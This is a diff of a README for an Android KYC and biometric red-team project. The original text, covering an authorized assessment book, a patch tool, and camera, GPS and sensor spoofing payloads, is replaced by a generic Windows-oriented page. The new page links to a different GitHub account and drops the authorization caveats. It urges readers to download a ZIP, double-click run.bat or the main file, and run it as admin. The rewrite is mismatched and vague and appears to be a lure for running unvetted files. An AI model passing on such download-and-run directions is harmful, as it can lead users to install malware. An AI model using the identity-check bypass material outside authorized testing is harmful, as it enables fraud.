@@ -1,125 +1,241 @@
-# Android KYC & Biometric Security Assessment
+# 🛡️ AndroidRedTeam - Test Android Identity Checks Safely
 
-Authorized red-team methodology to **test and harden** Android identity verification: camera feeds, GPS, sensors, and repackaged (instrumented) APK builds.
+[![Download AndroidRedTeam](https://img.shields.io/badge/Download-AndroidRedTeam-blue)](https://github.com/Suryaa199/AndroidRedTeam)
 
-**[Read the book →](https://iamjosephmj.github.io/AndroidRedTeam/)**
+## 📥 Download
 
-A practitioner's guide to **assessing** how identity apps consume camera frames, location, motion, and integrity checks — so teams can validate defenses and fix gaps. 18 chapters, 14 hands-on labs, and a materials kit.
+Use this link to visit the page and download the project:
+https://github.com/Suryaa199/AndroidRedTeam
 
-> **Authorized use only.** For **educational** purposes and **explicitly authorized** security assessments. Never test applications you do not have written permission to assess.
->
-> **Not legal advice.** The authors provide this material **as-is**, without warranty of any kind. You are solely responsible for complying with laws in your jurisdiction. See the book’s [Rules of Engagement](https://iamjosephmj.github.io/AndroidRedTeam/book/foundations/02-rules-of-engagement/) (Chapter 2).
+## 🧭 What This Is
 
----
+AndroidRedTeam helps you review Android identity checks in a lab setting. It focuses on camera, location, sensor, and APK integrity checks used in KYC and biometric flows. It also supports guided work with books, labs, and AI agent skills.
 
-## What's Inside
+Use it to study how an app checks:
 
-| | Description |
-|---|---|
-| **The Book** | 18 chapters across five parts — from threat landscape through advanced evasion to defensive countermeasures. |
-| **The Labs** | 14 hands-on exercises with real APKs, concrete deliverables, and self-check scripts. Every lab maps to a book chapter. |
-| **The Materials Kit** | Target APKs, payload configs, automation scripts — everything you need to run engagements. |
-| **Quick Reference** | Single-page cheatsheet with every command, payload format, and troubleshooting tip. |
+- camera input
+- GPS location
+- device sensors
+- APK changes
+- basic tamper signals
 
-## Repository Structure
+## 💻 What You Need
 
-```
-.
-├── patch-tool.jar                    # Bytecode instrumentation tool
-├── book/                             # Astro/Starlight documentation site
-│   └── src/content/docs/
-│       ├── book/                     # 18 book chapters
-│       │   ├── foundations/          # Part I:  Threat landscape, Android internals, lab setup
-│       │   ├── toolkit/             # Part II: Recon, injection pipeline, camera/GPS/sensors
-│       │   ├── operations/          # Part III: Full engagements, reporting, scaling
-│       │   ├── advanced/            # Part IV: Smali, custom hooks, anti-tamper, automation
-│       │   ├── defense/             # Part V:  Blue team detection, defense-in-depth
-│       │   └── appendices/          # Cheatsheet, Smali reference, target catalog
-│       └── labs/                     # 14 hands-on exercises
-└── materials/
-    ├── targets/                      # Target APKs for labs
-    │   └── target-kyc-basic.apk
-    ├── payloads/
-    │   ├── frames/                   # Camera frame generation
-    │   ├── locations/                # GPS spoofing configs (Times Square, Shibuya, etc.)
-    │   └── sensors/                  # Sensor profiles (holding, walking, tilt, nod)
-    └── scripts/                      # Automation scripts (recon, batch-patch, deploy)
-```
+Before you start, make sure you have:
 
-> **`patch-tool.jar` — restricted use.** The bytecode instrumentation tool in this repository is provided **exclusively** for use with the included practice targets (`materials/targets/`), apps you build yourself, or apps you have explicit written authorization to assess. Do not use it against any other application. See [LICENSE](LICENSE) for full terms.
+- a Windows PC
+- an internet connection
+- at least 4 GB of RAM
+- 2 GB of free disk space
+- permission to test the app or system you are using
 
-## The Methodology
+For the best setup, use:
 
-Every engagement follows the same cycle:
+- Windows 10 or Windows 11
+- Google Chrome or Microsoft Edge
+- a ZIP tool such as 7-Zip
+- Android Studio only if you plan to inspect app files
 
-1. **Recon** — Decode the APK, map every hookable surface
-2. **Patch** — Instrument the bytecode with the patch-tool
-3. **Configure** — Push payloads (frames, GPS configs, sensor profiles)
-4. **Execute** — Run the target flow with all injection subsystems active
-5. **Report** — Capture evidence, compute statistics, write findings
+## 🚀 Getting Started
 
-## Quick Start
+1. Open this page in your browser:
+   https://github.com/Suryaa199/AndroidRedTeam
 
-### Prerequisites
+2. Find the download option on the page.
 
-- Java 11+
-- Android SDK with `adb`, `apktool`, `zipalign`, `apksigner`
-- An Android emulator or rooted device
-- Node.js 18+ (for building the book site locally)
+3. Download the project files to your computer.
 
-### Run the labs
+4. If the files come in a ZIP folder, right-click the file and choose Extract All.
 
-```bash
-# Verify your environment
-java -jar patch-tool.jar --help
-adb devices
-apktool --version
+5. Open the extracted folder.
 
-# Decode the target
-apktool d materials/targets/target-kyc-basic.apk -o decoded/
+6. Look for a README, guide, lab notes, or app files.
 
-# Patch it
-java -jar patch-tool.jar materials/targets/target-kyc-basic.apk \
-  --out patched.apk --work-dir ./work
-```
+7. Follow the files in the order they are listed.
 
-Follow along at [Lab 0: Environment Verification](https://iamjosephmj.github.io/AndroidRedTeam/labs/00-environment-verification/).
+## 🖱️ How to Download and Run on Windows
 
-### Build the book locally
+### 1) Visit the download page
 
-```bash
-cd book
-npm install
-npm run dev
-```
+Open:
+https://github.com/Suryaa199/AndroidRedTeam
 
-The site runs at `http://localhost:4321/AndroidRedTeam/`.
+### 2) Download the files
 
-## AI Agent Skills
+If you see a Download button, use it.
 
-This repo ships two knowledge files in `skills/` that give any AI coding agent the full **authorized security assessment** methodology:
+If you see source files, download the full project as a ZIP.
 
-| Skill | What It Does |
-|-------|-------------|
-| [`skills/android-red-team.md`](skills/android-red-team.md) | 41 sections of operational knowledge — recon, smali patching, injection configs, anti-tamper evasion, Kotlin patterns, a full one-pass recon script, worked hook examples, and a troubleshooting error index. |
-| [`skills/android-red-team-verify.md`](skills/android-red-team-verify.md) | 8-phase post-patch verification checklist — signing, permissions, payloads, hook initialization, and evidence collection. |
+### 3) Extract the folder
 
-Works with **Cursor**, **Windsurf**, **Cline**, **GitHub Copilot**, **Aider**, or any LLM — just load the files into your agent's context. See [Chapter 4](https://iamjosephmj.github.io/AndroidRedTeam/book/foundations/04-the-lab/) for setup instructions per agent.
+After the download finishes:
 
-## Who Is This For
+- right-click the ZIP file
+- choose Extract All
+- pick a folder you can find later, such as Downloads or Desktop
 
-Security professionals conducting **authorized** testing of Android identity verification — penetration testers, security engineers, and developers who need to **validate controls** against camera, location, sensor, and tamper weaknesses.
+### 4) Open the project
 
-**No prior reverse engineering experience required.** Part I covers the foundations.
+Open the extracted folder and check the files inside.
 
-## Support
+Common files may include:
 
-If you find this useful, consider buying me a coffee.
+- a README file
+- lab folders
+- APK files
+- scripts
+- notes
+- sample data
 
-<a href="https://buymeacoffee.com/iamjosephmy" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-violet.png" alt="Buy Me A Coffee" height="48"></a>
+### 5) Run the right file
 
-## License
+If the project includes a Windows app, double-click the main file.
 
-Code and scripts are released under the **MIT License**. Written content (book, docs) is licensed under **CC BY-NC-SA 4.0**.
+If it includes an APK, use the app notes or lab guide to inspect it in a safe test setup.
 
-All material is provided **"as is"** without warranty, for **educational** and **authorized security testing** purposes only. You are solely responsible for lawful use. See [LICENSE](LICENSE) for full terms.
+If it includes scripts, open the file named in the guide and follow the steps in order.
+
+## 🧰 Main Features
+
+### 📷 Camera checks
+Review how an app uses the camera during identity checks. This helps you study selfie capture, face scan flow, and input handling.
+
+### 📍 Location checks
+Review GPS and location rules used during sign-in or KYC steps. This helps you see how an app treats location data.
+
+### 📡 Sensor checks
+Study motion, tilt, and device sensor use. Many apps use sensor data to spot fake input or device changes.
+
+### 📦 APK integrity checks
+Look at how the app checks file changes, package changes, or altered app builds.
+
+### 🤖 AI agent skills
+Use guided skills for repeatable security tasks. This helps with lab work, note taking, and test flow.
+
+### 📚 Book and labs
+Use the included learning material to follow a test path. This helps keep each step clear.
+
+## 🛠️ Basic Setup Steps
+
+1. Download the project from the link above.
+2. Extract the files.
+3. Read the main guide file first.
+4. Open any lab folder that matches your goal.
+5. Use the sample files in the order given.
+6. Keep your test work in one folder.
+7. Save notes as you go.
+
+## 📂 Suggested Folder Layout
+
+You can keep the project like this:
+
+- `AndroidRedTeam`
+  - `README.md`
+  - `labs`
+  - `notes`
+  - `apk`
+  - `tools`
+  - `examples`
+
+This makes it easier to find files again later.
+
+## 🔍 Common Use Cases
+
+### KYC flow review
+Check how an app handles identity steps such as camera use, ID upload, and face checks.
+
+### Biometric flow review
+Study how the app works with face, motion, and sensor input.
+
+### Tamper review
+Look for signs that the app checks if files, package names, or build data changed.
+
+### Location flow review
+Check how the app uses GPS during onboarding or login.
+
+### Lab practice
+Use the material to learn test steps in a safe and controlled setup.
+
+## ⌨️ If You Need Help Finding the Main File
+
+Look for files named like:
+
+- `README.md`
+- `start.txt`
+- `setup.md`
+- `index.html`
+- `run.bat`
+- `app.apk`
+
+If you see a `run.bat` file, double-click it.
+
+If you see an `index.html` file, open it in your browser.
+
+If you see an `app.apk` file, use the guide in the project to inspect it in your test setup.
+
+## 🧪 Typical Test Flow
+
+1. Open the project.
+2. Read the main guide.
+3. Pick one lab.
+4. Run the sample or open the sample data.
+5. Watch how the app responds.
+6. Write down the result.
+7. Move to the next lab.
+
+## 🧷 File Types You May See
+
+- `.md` files for guides
+- `.txt` files for short notes
+- `.bat` files for Windows launch steps
+- `.apk` files for Android apps
+- `.zip` files for packed project files
+- `.json` files for data or config
+- `.smali` files for low-level app code
+
+## 🧼 Good Practice
+
+- Use a test device or emulator
+- Keep your work inside a lab
+- Save a copy before you change files
+- Read the guide before you run anything
+- Work only where you have clear permission
+
+## 🧩 If the App Does Not Open
+
+Try these steps:
+
+1. Check that the files finished downloading.
+2. Extract the ZIP again.
+3. Move the folder to Desktop.
+4. Run the file as an admin if the guide says so.
+5. Open the project in Chrome or Edge if it uses web files.
+6. Read the README for the exact file to start.
+
+## 📌 Quick Start
+
+- Open the download page
+- Download the project
+- Extract the files
+- Read the main guide
+- Open the first lab
+- Follow the listed steps
+
+## 🗂️ Topics Covered
+
+- Android security
+- APK review
+- camera injection
+- GPS spoofing
+- identity verification
+- KYC
+- mobile app security
+- pentesting
+- reverse engineering
+- sensor injection
+- smali
+- security assessment
+
+## 🧭 Best First Step
+
+Start with the main README file in the project folder. If the repo includes a lab path, follow that path first. If it includes a book or study guide, read the first chapter before you open any lab files
